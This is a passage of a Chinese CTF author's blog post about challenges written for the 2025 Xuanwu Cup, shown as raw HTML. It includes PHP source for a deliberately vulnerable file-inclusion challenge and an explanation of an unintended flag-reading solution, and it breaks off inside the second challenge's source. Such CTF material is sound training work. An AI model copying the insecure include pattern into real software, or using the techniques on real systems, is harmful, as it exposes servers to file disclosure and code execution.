<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="这次也是轮到我出题了">
<meta property="og:type" content="article">
<meta property="og:title" content="2025玄武杯出题记录">
<meta property="og:url" content="https://wanth3f1ag.top/2025/11/02/2025%E7%8E%84%E6%AD%A6%E6%9D%AF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="这次也是轮到我出题了">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101195023820.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101234410001.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101234958842.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101235136654.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102001239686.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102001830074.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102003229685.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010210728.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010650599.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010817779.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010927818.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011703825.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011740944.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011844148.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011950875.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102012815492.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013021745.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013227194.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013300730.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013436744.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013514065.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013634506.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102014430383.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102222414932.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102223300474.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102224355494.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102224459510.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103100705206.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103100732196.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103101028951.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103102934526.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103104052595.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103104145632.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103105652382.png">
<meta property="article:published_time" content="2025-11-01T16:39:07.000Z">
<meta property="article:modified_time" content="2025-12-01T11:04:53.389Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="2025玄武杯">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251101195023820.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/11/02/2025%E7%8E%84%E6%AD%A6%E6%9D%AF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/11/02/2025%E7%8E%84%E6%AD%A6%E6%9D%AF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/","path":"2025/11/02/2025玄武杯出题记录/","title":"2025玄武杯出题记录"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2025玄武杯出题记录 | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-include"><span class="nav-number">2.</span> <span class="nav-text">ez_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-include-revenge"><span class="nav-number">3.</span> <span class="nav-text">ez_include_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#include%E5%92%8Cfile-get-content%E5%A4%84%E7%90%86%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.1.</span> <span class="nav-text">include和file_get_content处理协议的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file-get-content%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.1.1.</span> <span class="nav-text">file_get_content的源码实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#include%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.1.2.</span> <span class="nav-text">include的源码实现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%84%8F%E5%A4%96%E4%B9%8B%E5%96%9C"><span class="nav-number">3.2.</span> <span class="nav-text">意外之喜</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#include%E5%92%8Cfile-get-contents%E5%8C%B9%E9%85%8D%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.2.1.</span> <span class="nav-text">include和file_get_contents匹配文件的区别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%94%A6%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88"><span class="nav-number">4.</span> <span class="nav-text">锦家有什么</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI"><span class="nav-number">4.1.</span> <span class="nav-text">#SSTI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%BC%E8%A7%81%E4%B8%8D%E4%B8%80%E5%AE%9A%E4%B8%BA%E5%AE%9E"><span class="nav-number">5.</span> <span class="nav-text">眼见不一定为实</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nginx%E5%92%8Cflask%E5%A4%84%E7%90%86%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.1.</span> <span class="nav-text">#nginx和flask处理特殊字符漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%87%A0%E4%B8%AAweb%E7%9A%84%E9%A2%98"><span class="nav-number">7.</span> <span class="nav-text">其他几个web的题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#normal-php"><span class="nav-number">8.</span> <span class="nav-text">normal_php</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E7%89%B9%E6%80%A7-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">8.1.</span> <span class="nav-text">#php特性+文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-file"><span class="nav-number">9.</span> <span class="nav-text">ez_file</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">9.1.</span> <span class="nav-text">#变量覆盖+文件上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-fastapi"><span class="nav-number">10.</span> <span class="nav-text">ez_fastapi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSTI"><span class="nav-number">10.1.</span> <span class="nav-text">#无回显SSTI</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">186</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">121</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/11/02/2025%E7%8E%84%E6%AD%A6%E6%9D%AF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="2025玄武杯出题记录 | root@wanth3f1ag">
      <meta itemprop="description" content="这次也是轮到我出题了">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2025玄武杯出题记录
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-11-02 00:39:07" itemprop="dateCreated datePublished" datetime="2025-11-02T00:39:07+08:00">2025-11-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:04:53" itemprop="dateModified" datetime="2025-12-01T19:04:53+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%87%BA%E9%A2%98%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">出题记</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>29k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>26 分钟</span>
    </span>
</div>

            <div class="post-description">这次也是轮到我出题了</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今年也是轮到我出题了，其实还蛮紧张的，不过确实在出题的时候也遇到了很多问题，甚至出现了犯蠢导致存在非预期的情况，在此跟选手道个歉，虽然是第一次出题，但是还是有在认真对待，望海涵</p>
<h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>这就是我犯蠢的地方！！！</p>
<p>打开题目就是源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no_hl&#x27;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;mkdir -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;profile&#x27;</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Warning: <span class="title function_ invoke__">chdir</span>(): No such file <span class="keyword">or</span> <span class="title function_ invoke__">directory</span> (errno <span class="number">2</span>) in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">11</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">file_get_contents</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">21</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">file_get_contents</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">21</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">include</span>(): Filename cannot be <span class="keyword">empty</span> in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">22</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="keyword">include</span>(): Failed opening <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> <span class="title function_ invoke__">inclusion</span> (include_path=<span class="string">&#x27;.:/usr/local/lib/php&#x27;</span>) in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>这里的话因为存在非预期，所以预期的解法以及代码分析我会放在revenge里面讲</p>
<p>从include外层的if语句就可以分析到，并没有什么特别的限制，聪明的人直接尝试&#x2F;flag就出了，因为恰好我在出题的时候习惯性把flag放在根目录且没有改名，所以导致了一个很严重的非预期</p>
<h2 id="ez-include-revenge"><a href="#ez-include-revenge" class="headerlink" title="ez_include_revenge"></a>ez_include_revenge</h2><p>这道题是大家很关心的一道题，比赛期间也是很多很多师傅来问过我思路了，具体源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no_hl&#x27;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;mkdir -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ 